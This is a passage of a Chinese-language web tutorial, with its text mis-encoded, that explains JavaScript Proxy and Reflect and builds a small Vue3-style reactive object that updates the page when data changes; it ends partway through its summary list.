p9GpV9VERxQM0lPhrVDyrCVMJr5/fwZJ+qWewR1lSuNJ21sXxnjVgIhck5VhM/cqG1WBpIAMX4Z9Xz+eP58sFUiOBArLQcZpQ0CNCXt1HzA5OfPOFGrrwYHyKTwbNJsxolaJUJbKeo0mu/4uMeXBHBbJSK88qP5jo97fAYva5UIDgivHEXk7mecqKNEhFeOhsjdbxKR+0pb+UsCuK0qIveVtvJn8LJWieAAi9nc/YwTdZQIi9nc/SYR4ZWenSO2yZvgcwTuRYZKWBnUI3e/xF7gcmio5L4HWPlL7AVuyPol95W28me8EnuBa8J+sZjM3c94JfYCd6VxTXjaCjDLe+K9cwTuSuOa8LQUYPXvh1d3w0HC7JK8kMK0/rcJfwHkVMYgi4xhOgAAAABJRU5ErkJggg==");background-size:100%}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>ä¼—æ‰€å‘¨çŸ¥ï¼Œåœ¨Vue3ä¸­ï¼Œç”¨Proxyä»£ç†ä»£æ›¿äº†åŸæœ‰çš„<code>Object.defineProperty</code>ï¼Œæ¥ä¸‹æ¥æˆ‘ç”¨æ‰‹å†™æ•°æ®å“åº”çš„æ–¹å¼ï¼Œè®©å¤§å®¶å†æ¬¡æ·±åˆ»çš„ç†è§£ä¸€ä¸‹Proxyç©¶ç«Ÿæ˜¯ä»€ä¹ˆæ ·çš„â€œMagicâ€ ã€‚</p>
</blockquote>
<h2 data-id="heading-0">ä¸€ã€å…ˆææ‡‚ï¼šä»€ä¹ˆæ˜¯ã€Œæ•°æ®å“åº”å¼ã€ï¼Ÿ</h2>
<p>ç®€å•è¯´ï¼š<strong>å½“æ•°æ®å‘ç”Ÿå˜åŒ–æ—¶ï¼Œé¡µé¢ï¼ˆæˆ–é€»è¾‘ï¼‰è‡ªåŠ¨åšå‡ºååº”ï¼Œä¸éœ€è¦æˆ‘ä»¬æ‰‹åŠ¨å»æ›´æ–°</strong>ã€‚</p>
<p>ä¸¾ä¸ªç”Ÿæ´»ä¾‹å­ï¼š</p>
<ul>
<li>ä½ åœ¨è´­ç‰© APP ä¸ŠæŠŠå•†å“åŠ å…¥è´­ç‰©è½¦ï¼ˆæ•°æ®å˜åŒ–ï¼šè´­ç‰©è½¦åˆ—è¡¨æ–°å¢å•†å“ï¼‰</li>
<li>è´­ç‰©è½¦å›¾æ ‡ä¸Šçš„æ•°å­—è‡ªåŠ¨ä» 0 å˜æˆ 1ï¼ˆé¡µé¢è‡ªåŠ¨ååº”ï¼‰</li>
<li>è¿™ä¸ª â€œæ•°æ®å˜ â†’ é¡µé¢è‡ªåŠ¨å˜â€ çš„è¿‡ç¨‹ï¼Œå°±æ˜¯æ•°æ®å“åº”å¼ã€‚</li>
</ul>
<p>åœ¨ä»£ç é‡Œï¼Œæ²¡æœ‰å“åº”å¼æ—¶ï¼Œæˆ‘ä»¬è¦æ‰‹åŠ¨åšæ‰€æœ‰æ“ä½œï¼›æœ‰äº†å“åº”å¼ï¼Œæ•°æ®å˜åŒ–ä¼š â€œè‡ªåŠ¨è§¦å‘â€ åç»­é€»è¾‘ï¼Œè¿™å°±æ˜¯ Proxy çš„æ ¸å¿ƒä»·å€¼ã€‚ å¤§å®¶å‘ç°äº†å—ï¼Œç‰¹ç‚¹å°±æ˜¯ï¼š<strong>æ£€æµ‹æ•°æ®å˜åŒ–-&gt;è§¦å‘æ•°æ®æ›´æ–°-&gt;è§†å›¾æ¸²æŸ“</strong> è¿™ä¸‰ä¸ªæ­¥éª¤ã€‚</p>
<h2 data-id="heading-1">äºŒã€å…ˆè®¤è¯†ä¸¤ä¸ªæ ¸å¿ƒå·¥å…·ï¼šProxy å’Œ Reflect</h2>
<p>è¿™ä¸¤ä¸ªæ˜¯ ES6 æ–°å¢çš„ APIï¼Œä¹Ÿæ˜¯å®ç°å“åº”å¼çš„åŸºç¡€ï¼Œæˆ‘ä»¬å…ˆé€ä¸ªææ‡‚ï¼Œä¸ç€æ€¥ç»„åˆã€‚</p>
<h3 data-id="heading-2">Proxyï¼šç»™å¯¹è±¡åŠ ä¸€ä¸ª â€œç›‘å¬å™¨ / æ‹¦æˆªå™¨â€</h3>
<p>ä½ å¯ä»¥æŠŠÂ <code>Proxy</code>Â ç†è§£ä¸ºï¼š<strong>ç»™æ™®é€šå¯¹è±¡å¥—äº†ä¸€ä¸ª â€œä¿æŠ¤å£³â€ï¼Œä»»ä½•å¯¹å¯¹è±¡çš„ã€Œè¯»å–ã€ã€Œä¿®æ”¹ã€æ“ä½œï¼Œéƒ½å¿…é¡»å…ˆç»è¿‡è¿™ä¸ªä¿æŠ¤å£³ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨å£³é‡Œç›‘å¬ / æ‹¦æˆªè¿™äº›æ“ä½œ</strong>ã€‚</p>
<h4 data-id="heading-3">Proxy çš„åŸºæœ¬è¯­æ³•</h4>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> person = {
  <span class="hljs-attr">name</span>: <span class="hljs-string">"å¼ ä¸‰"</span>,
  <span class="hljs-attr">age</span>: <span class="hljs-number">20</span>
};

<span class="hljs-comment">//  åˆ›å»º Proxy ä»£ç†å¯¹è±¡ï¼ˆç»™ person å¥—ä¸Šâ€œç›‘å¬å™¨â€ï¼‰</span>
<span class="hljs-keyword">const</span> proxyPerson = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Proxy</span>(person, {
  <span class="hljs-comment">// ã€æ‹¦æˆªè¯»å–æ“ä½œã€‘ï¼šå½“è¯»å– proxyPerson çš„å±æ€§æ—¶ï¼Œè‡ªåŠ¨è§¦å‘è¿™ä¸ª get æ–¹æ³•</span>
  <span class="hljs-title function_">get</span>(<span class="hljs-params">target, property</span>) {
    <span class="hljs-comment">// targetï¼šè¢«ä»£ç†çš„åŸå§‹å¯¹è±¡ï¼ˆè¿™é‡Œå°±æ˜¯ personï¼‰</span>
    <span class="hljs-comment">// propertyï¼šå½“å‰è¦è¯»å–çš„å±æ€§åï¼ˆæ¯”å¦‚è¯»å– proxyPerson.name æ—¶ï¼Œproperty å°±æ˜¯ "name"ï¼‰</span>
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`æœ‰äººè¯»å–äº† <span class="hljs-subst">${property}</span> å±æ€§`</span>);
    <span class="hljs-comment">// è¿”å›å±æ€§å€¼ï¼ˆä¸è®©è¯»å–æ“ä½œè¢«æ‹¦æˆªåâ€œä¸¢å¤±â€ï¼‰</span>
    <span class="hljs-keyword">return</span> target[property];
  },

  <span class="hljs-comment">// ã€æ‹¦æˆªä¿®æ”¹æ“ä½œã€‘ï¼šå½“ä¿®æ”¹ proxyPerson çš„å±æ€§æ—¶ï¼Œè‡ªåŠ¨è§¦å‘è¿™ä¸ª set æ–¹æ³•</span>
  <span class="hljs-title function_">set</span>(<span class="hljs-params">target, property, value</span>) {
    <span class="hljs-comment">// targetï¼šè¢«ä»£ç†çš„åŸå§‹å¯¹è±¡ï¼ˆpersonï¼‰</span>
    <span class="hljs-comment">// propertyï¼šå½“å‰è¦ä¿®æ”¹çš„å±æ€§åï¼ˆæ¯”å¦‚ä¿®æ”¹ proxyPerson.age æ—¶ï¼Œproperty å°±æ˜¯ "age"ï¼‰</span>
    <span class="hljs-comment">// valueï¼šå½“å‰è¦ä¿®æ”¹çš„æ–°å€¼ï¼ˆæ¯”å¦‚ proxyPerson.age = 21ï¼Œvalue å°±æ˜¯ 21ï¼‰</span>
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`æœ‰äººä¿®æ”¹äº† <span class="hljs-subst">${property}</span> å±æ€§ï¼Œæ–°å€¼æ˜¯ <span class="hljs-subst">${value}</span>`</span>);
    <span class="hljs-comment">// æ‰§è¡ŒçœŸæ­£çš„ä¿®æ”¹æ“ä½œï¼ˆæŠŠæ–°å€¼èµ‹ç»™åŸå§‹å¯¹è±¡çš„å¯¹åº”å±æ€§ï¼‰</span>
    target[property] = value;
    <span class="hljs-comment">// æ³¨æ„ï¼šset æ–¹æ³•æœ€å¥½è¿”å› trueï¼Œè¡¨ç¤ºä¿®æ”¹æˆåŠŸï¼ˆä¿æŒåŸç”Ÿè¡Œä¸ºï¼‰</span>
    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
  }
});
</code></pre>
<h4 data-id="heading-4">æµ‹è¯•ä¸€ä¸‹ Proxy çš„æ•ˆæœ</h4>
<p>æˆ‘ä»¬ä¸ç›´æ¥æ“ä½œåŸå§‹å¯¹è±¡Â <code>person</code>ï¼Œè€Œæ˜¯æ“ä½œä»£ç†å¯¹è±¡Â <code>proxyPerson</code>ï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(proxyPerson.<span class="hljs-property">name</span>);  <span class="hljs-comment">//æŸ¥çœ‹ä»£ç†ånameå±æ€§çš„ä¸‹çš„å€¼</span>
proxyPerson.<span class="hljs-property">age</span> = <span class="hljs-number">20</span>;           <span class="hljs-comment">//æ›´æ”¹å±æ€§ageçš„å€¼</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(proxyPerson.<span class="hljs-property">age</span>);   <span class="hljs-comment">//è¾“å‡ºæ›´æ”¹å±æ€§ageåçš„å€¼</span>

</code></pre>
<p>ä½ å°†ä¼šçœ‹åˆ°</p>
<p align="center"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ff38ac6025ab4331bd50eca25b20da16~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTWF4a2lt:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767619017&amp;x-signature=0G6LmtoL4nZIAFwLxZw%2B9LsxVBw%3D" alt="image.png" width="50%" loading="lazy"/></p>
<p><strong>å¼ºè°ƒ</strong></p>
<ul>
<li>ä»£ç†å¯¹è±¡ï¼ˆ<code>proxyPerson</code>ï¼‰å’ŒåŸå§‹å¯¹è±¡ï¼ˆ<code>person</code>ï¼‰æ˜¯ â€œå…³è”â€ çš„ï¼Œä½†ä¸æ˜¯åŒä¸€ä¸ªå¯¹è±¡</li>
<li>å¿…é¡»æ“ä½œ<strong>ä»£ç†å¯¹è±¡</strong>æ‰ä¼šè§¦å‘æ‹¦æˆªå™¨ï¼Œç›´æ¥æ“ä½œåŸå§‹å¯¹è±¡ä¸ä¼šæœ‰ä»»ä½•ååº”ï¼š</li>
</ul>
<p>åƒä¸‹é¢è¿™æ ·æ˜¯<strong>æ— æ•ˆçš„</strong></p>
<p align="center"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e5c8a109a0994cf692c4f54b1562b2c1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTWF4a2lt:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767619017&amp;x-signature=oGa64MDSR4oQEctM28fCUTc3wj4%3D" alt="image.png" width="50%" loading="lazy"/></p>
<h3 data-id="heading-5">Â Reflectï¼šæ›´ â€œå‹å¥½â€ çš„å¯¹è±¡æ“ä½œå·¥å…·</h3>
<p>åˆšæ‰æˆ‘ä»¬åœ¨ Proxy çš„ get/set é‡Œï¼Œç”¨äº†Â <code>target[property]</code>Â è¯»å–ã€<code>target[property] = value</code>Â ä¿®æ”¹ï¼Œè¿™æ˜¯æ™®é€šå†™æ³•ï¼Œä½†æœ‰ä¸€äº›å‘ï¼ˆæ¯”å¦‚ç»§æ‰¿åœºæ™¯ã€ä¸¥æ ¼æ¨¡å¼ä¸‹å¯èƒ½å‡ºé”™ï¼‰ã€‚</p>
<p>ES6 æä¾›äº†Â <code>Reflect</code>ï¼Œå®ƒçš„ä½œç”¨å°±æ˜¯ï¼š<strong>ç”¨ â€œæ›´æ ‡å‡†ã€æ›´å®‰å…¨â€ çš„æ–¹å¼ï¼Œæ‰§è¡Œå¯¹è±¡çš„åŸºæœ¬æ“ä½œï¼ˆè¯»å–ã€ä¿®æ”¹ç­‰ï¼‰ï¼Œå’Œ Proxy æ˜¯ â€œæœ€ä½³æ­æ¡£â€</strong> ã€‚</p>
<h4 data-id="heading-6">Reflect çš„æ ¸å¿ƒç”¨æ³•ï¼ˆå’Œ Proxy å¯¹åº”ï¼‰</h4>
<p><code>Reflect</code>Â æ˜¯ä¸€ä¸ªå†…ç½®å¯¹è±¡ï¼Œä¸èƒ½å®ä¾‹åŒ–ï¼Œç›´æ¥è°ƒç”¨å®ƒçš„é™æ€æ–¹æ³•å³å¯ï¼Œæœ€å¸¸ç”¨çš„å°±æ˜¯Â <code>Reflect.get</code>Â å’ŒÂ <code>Reflect.set</code>ï¼Œå¯¹åº”å¯¹è±¡çš„ â€œè¯»å–â€ å’Œ â€œä¿®æ”¹â€ï¼š</p>




















<table><thead><tr><th>æ™®é€šå¯¹è±¡æ“ä½œ</th><th>Reflect å¯¹åº”æ“ä½œ</th><th>ä½œç”¨</th></tr></thead><tbody><tr><td>target[property]</td><td>Reflect.get(target, property)</td><td>è¯»å–å¯¹è±¡çš„æŸä¸ªå±æ€§å€¼</td></tr><tr><td>target[property] = value</td><td>Reflect.set(target, property, value)</td><td>ä¿®æ”¹å¯¹è±¡çš„æŸä¸ªå±æ€§å€¼</td></tr></tbody></table>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> person = { <span class="hljs-attr">name</span>: <span class="hljs-string">"å¼ ä¸‰"</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">20</span> };

<span class="hljs-keyword">const</span> proxyPerson = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Proxy</span>(person, {
  <span class="hljs-title function_">get</span>(<span class="hljs-params">target, property</span>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`æœ‰äººè¯»å–äº† <span class="hljs-subst">${property}</span> å±æ€§`</span>);
    <span class="hljs-comment">// ç”¨ Reflect.get ä»£æ›¿ target[property]</span>
    <span class="hljs-keyword">return</span> <span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">get</span>(target, property);
  },
  <span class="hljs-title function_">set</span>(<span class="hljs-params">target, property, value</span>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`æœ‰äººä¿®æ”¹äº† <span class="hljs-subst">${property}</span> å±æ€§ï¼Œæ–°å€¼æ˜¯ <span class="hljs-subst">${value}</span>`</span>);
    <span class="hljs-comment">// ç”¨ Reflect.set ä»£æ›¿ target[property] = value</span>
    <span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">set</span>(target, property, value);
    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
  }
});
</code></pre>
<h2 data-id="heading-7">ä¸‰ã€åˆ†æ­¥å®ç°ï¼šåŸºäº Proxy çš„å®Œæ•´å“åº”å¼</h2>
<p>æˆ‘ä»¬åˆ† 2 æ­¥å®ç°ï¼Œä»ç®€å•åˆ°å¤æ‚ï¼Œæ¯ä¸€æ­¥éƒ½èƒ½ç‹¬ç«‹è¿è¡Œï¼Œæ–¹ä¾¿ä½ æµ‹è¯•ç†è§£ã€‚</p>
<h3 data-id="heading-8">æ­¥éª¤ 1ï¼šå°è£…ä¸€ä¸ªåŸºç¡€çš„å“åº”å¼å‡½æ•°ï¼ˆç›‘å¬è¯»å†™ï¼‰</h3>
<p>æˆ‘ä»¬å…ˆæŠŠ Proxy çš„é€»è¾‘å°è£…æˆä¸€ä¸ªå‡½æ•°ï¼Œæ–¹ä¾¿å¤ç”¨ï¼ˆè¿™å°±æ˜¯ Vue3 ä¸­Â <code>reactive</code>Â å‡½æ•°çš„ç®€åŒ–ç‰ˆï¼‰ã€‚</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">/**
 * å°è£…å“åº”å¼å‡½æ•°ï¼šç»™æ™®é€šå¯¹è±¡è¿”å›ä¸€ä¸ªä»£ç†å¯¹è±¡
 * <span class="hljs-doctag">@param</span> {<span class="hljs-type">Object</span>} <span class="hljs-variable">obj</span> - è¦è¢«ä»£ç†çš„åŸå§‹å¯¹è±¡
 * <span class="hljs-doctag">@returns</span> {<span class="hljs-type">Proxy</span>} - ä»£ç†åçš„å“åº”å¼å¯¹è±¡
 */</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">makeReactive</span>(<span class="hljs-params">obj</span>) {
  <span class="hljs-comment">// åˆ›å»º Proxy ä»£ç†</span>
  <span class="hljs-keyword">const</span> proxyObj = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Proxy</span>(obj, {
    <span class="hljs-comment">// æ‹¦æˆªè¯»å–æ“ä½œ</span>
    <span class="hljs-title function_">get</span>(<span class="hljs-params">target, property</span>) {
      <span class="hljs-comment">// è¯»å–å±æ€§å¹¶è¿”å›</span>
      <span class="hljs-keyword">return</span> <span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">get</span>(target, property);
    },
    <span class="hljs-comment">// æ‹¦æˆªä¿®æ”¹æ“ä½œ</span>
    <span class="hljs-title function_">set</span>(<span class="hljs-params">target, property, value</span>) {
      <span class="hljs-comment">// æ‰§è¡Œä¿®æ”¹æ“ä½œ</span>
      <span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">set</span>(target, property, value);
      <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
    }
  });

  <span class="hljs-comment">// è¿”å›ä»£ç†å¯¹è±¡</span>
  <span class="hljs-keyword">return</span> proxyObj;
}
</code></pre>
<h3 data-id="heading-9">æ­¥éª¤ 2ï¼šå‡çº§ï¼šå®ç° â€œæ•°æ®å˜ â†’ é¡µé¢è‡ªåŠ¨æ›´æ–°â€</h3>
<p>å¤§å®¶æœ€å…³å¿ƒçš„æ˜¯ï¼šå¦‚ä½•è®©æ•°æ®å˜åŒ–æ—¶ï¼Œé¡µé¢ DOM è‡ªåŠ¨æ›´æ–°ï¼Ÿæˆ‘ä»¬åŸºäºä¸Šé¢çš„ä»£ç ï¼Œæ–°å¢ DOM æ›´æ–°é€»è¾‘ï¼Œæ›´è´´è¿‘å®é™…é¡¹ç›®ä½¿ç”¨ã€‚</p>
<h4 data-id="heading-10">å®Œæ•´ä»£ç ï¼ˆå¯ç›´æ¥å¤åˆ¶åˆ° HTML æ–‡ä»¶ä¸­è¿è¡Œï¼‰</h4>
<pre><code class="hljs language-html" lang="html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">"zh-CN"</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">"UTF-8"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>æ–°æ‰‹ç‰ˆ Proxy å“åº”å¼<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="css">
    <span class="hljs-selector-class">.user-info</span> {
      <span class="hljs-attribute">margin</span>: <span class="hljs-number">20px</span>;
      <span class="hljs-attribute">padding</span>: <span class="hljs-number">20px</span>;
      <span class="hljs-attribute">border</span>: <span class="hljs-number">1px</span> solid <span class="hljs-number">#ccc</span>;
    }
  </span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
  <span class="hljs-comment">&lt;!-- é¡µé¢DOMï¼šè¦è‡ªåŠ¨æ›´æ–°çš„å†…å®¹ --&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"user-info"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>ç”¨æˆ·åï¼š<span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"username"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>ç­‰çº§ï¼š<span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"level"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"upgradeBtn"</span>&gt;</span>ç‚¹å‡»å‡çº§ç­‰çº§<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>

  <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
    <span class="hljs-comment">// æ­¥éª¤1ï¼šå°è£…å“åº”å¼å‡½æ•°ï¼ˆæ–°å¢ï¼šDOMæ›´æ–°é€»è¾‘ï¼‰</span>
    <span class="hljs-keyword">function</span> <span class="hljs-title function_">makeReactive</span>(<span class="hljs-params">obj</span>) {
      <span class="hljs-keyword">const</span> proxyObj = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Proxy</span>(obj, {
        <span class="hljs-title function_">get</span>(<span class="hljs-params">target, property</span>) {
          <span class="hljs-keyword">return</span> <span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">get</span>(target, property);
        },
        <span class="hljs-title function_">set</span>(<span class="hljs-params">target, property, value</span>) {
          <span class="hljs-comment">// 1. å…ˆä¿®æ”¹æ•°æ®</span>
          <span class="hljs-keyword">const</span> oldValue = target[property];
          <span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">set</span>(target, property, value);

          <span class="hljs-comment">// 2. æ•°æ®ä¿®æ”¹åï¼Œè‡ªåŠ¨æ›´æ–°DOMï¼ˆæ ¸å¿ƒï¼šå“åº”å¼çš„å®é™…è½åœ°ï¼‰</span>
          <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`æ•°æ® <span class="hljs-subst">${property}</span> å˜åŒ–ï¼Œè‡ªåŠ¨æ›´æ–°é¡µé¢`</span>);
          <span class="hljs-title function_">updateDOM</span>(property, value);

          <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
        }
      });
      <span class="hljs-keyword">return</span> proxyObj;
    }

    <span class="hljs-comment">// æ­¥éª¤2ï¼šå°è£… DOM æ›´æ–°å‡½æ•°ï¼ˆæ ¹æ®æ•°æ®å˜åŒ–ï¼Œæ›´æ–°å¯¹åº”é¡µé¢å…ƒç´ ï¼‰</span>
    <span class="hljs-keyword">function</span> <span class="hljs-title function_">updateDOM</span>(<span class="hljs-params">property, value</span>) {
      <span class="hljs-keyword">if</span> (property === <span class="hljs-string">"username"</span>) {
        <span class="hljs-comment">// æ‰¾åˆ°é¡µé¢ä¸Šçš„ username å…ƒç´ ï¼Œæ›´æ–°å†…å®¹</span>
        <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">"username"</span>).<span class="hljs-property">innerText</span> = value;
      }
      <span class="hljs-keyword">if</span> (property === <span class="hljs-string">"level"</span>) {
        <span class="hljs-comment">// æ‰¾åˆ°é¡µé¢ä¸Šçš„ level å…ƒç´ ï¼Œæ›´æ–°å†…å®¹</span>
        <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">"level"</span>).<span class="hljs-property">innerText</span> = value;
      }
    }

    <span class="hljs-comment">// æ­¥éª¤3ï¼šåˆå§‹åŒ–æ•°æ®å’Œé¡µé¢</span>
    <span class="hljs-comment">// 1. åŸå§‹æ•°æ®</span>
    <span class="hljs-keyword">const</span> user = {
      <span class="hljs-attr">username</span>: <span class="hljs-string">"å‰ç«¯æ–°æ‰‹"</span>,
      <span class="hljs-attr">level</span>: <span class="hljs-number">1</span>
    };
    <span class="hljs-comment">// 2. ç”Ÿæˆå“åº”å¼å¯¹è±¡</span>
    <span class="hljs-keyword">const</span> reactiveUser = <span class="hljs-title function_">makeReactive</span>(user);
    <span class="hljs-comment">// 3. åˆå§‹åŒ–é¡µé¢ï¼ˆç¬¬ä¸€æ¬¡æ‰‹åŠ¨æ¸²æŸ“ï¼Œåç»­è‡ªåŠ¨æ›´æ–°ï¼‰</span>
    <span class="hljs-title function_">updateDOM</span>(<span class="hljs-string">"username"</span>, reactiveUser.<span class="hljs-property">username</span>);
    <span class="hljs-title function_">updateDOM</span>(<span class="hljs-string">"level"</span>, reactiveUser.<span class="hljs-property">level</span>);

    <span class="hljs-comment">// æ­¥éª¤4ï¼šç»‘å®šæŒ‰é’®ç‚¹å‡»äº‹ä»¶ï¼ˆä¿®æ”¹æ•°æ®ï¼Œæµ‹è¯•è‡ªåŠ¨æ›´æ–°ï¼‰</span>
    <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">"upgradeBtn"</span>).<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">"click"</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
      <span class="hljs-comment">// åªéœ€è¦ä¿®æ”¹å“åº”å¼æ•°æ®ï¼Œé¡µé¢ä¼šè‡ªåŠ¨æ›´æ–°ï¼</span>
      reactiveUser.<span class="hljs-property">level</span> = reactiveUser.<span class="hljs-property">level</span> + <span class="hljs-number">1</span>;
      <span class="hljs-title function_">alert</span>(<span class="hljs-string">`ç­‰çº§å‡çº§æˆåŠŸï¼å½“å‰ç­‰çº§ï¼š<span class="hljs-subst">${reactiveUser.level}</span>`</span>);
    });
  </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span>
</code></pre>
<h4 data-id="heading-11">è¿è¡Œæ•ˆæœ</h4>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3f81af0acfd74dc3b3a252ae7056d283~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTWF4a2lt:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767619017&amp;x-signature=BvCTAWXu3jr5LimtmNvFIP%2F9YQY%3D" alt="image.png" loading="lazy"/></p>
<ol>
<li>
<p>æ‰“å¼€ HTML æ–‡ä»¶ï¼Œé¡µé¢ä¸Šä¼šæ˜¾ç¤ºç”¨æˆ·åå’Œç­‰çº§</p>
</li>
<li>
<p>ç‚¹å‡» â€œç‚¹å‡»å‡çº§ç­‰çº§â€ æŒ‰é’®</p>
</li>
<li>
<p>ä½ ä¼šå‘ç°ï¼š</p>
<ul>
<li>å¼¹çª—æç¤ºç­‰çº§å‡çº§</li>
<li>é¡µé¢ä¸Šçš„ â€œç­‰çº§â€ æ•°å­—ä¼š<strong>è‡ªåŠ¨ä» 1 å˜æˆ 2ï¼Œå†ç‚¹å‡»å˜æˆ 3...</strong></li>
<li>æˆ‘ä»¬æ²¡æœ‰æ‰‹åŠ¨å†™Â <code>document.getElementById("level").innerText = æ–°å€¼</code>ï¼Œè€Œæ˜¯æ•°æ®å˜åŒ–åè‡ªåŠ¨è§¦å‘ï¼Œè¿™å°±æ˜¯å®Œæ•´çš„å“åº”å¼æ•ˆæœï¼</li>
</ul>
</li>
</ol>
<h2 data-id="heading-12">å››ã€æ ¸å¿ƒçŸ¥è¯†ç‚¹ï¼ˆæ€»ç»“ï¼‰</h2>
<ol>
<li>
<p><strong>æ•°æ®å“åº”å¼</strong>ï¼šæ•°æ®å˜ â†’ é¡µé¢ / é€»è¾‘è‡ªåŠ¨å˜ï¼Œæ— éœ€æ‰‹åŠ¨æ“ä½œã€‚</p>
</li>
<li>
<p><strong>Proxy</strong>ï¼šç»™å¯¹è±¡åŠ  â€œæ‹¦æˆªå™¨â€ï¼Œç›‘å¬ã€Œè¯»å–ï¼ˆgetï¼‰ã€å’Œã€Œä¿®æ”¹ï¼ˆsetï¼‰ã€æ“ä½œï¼Œæ˜¯å®ç°å“åº”å¼çš„æ ¸å¿ƒã€‚</p>
</li>
<li>
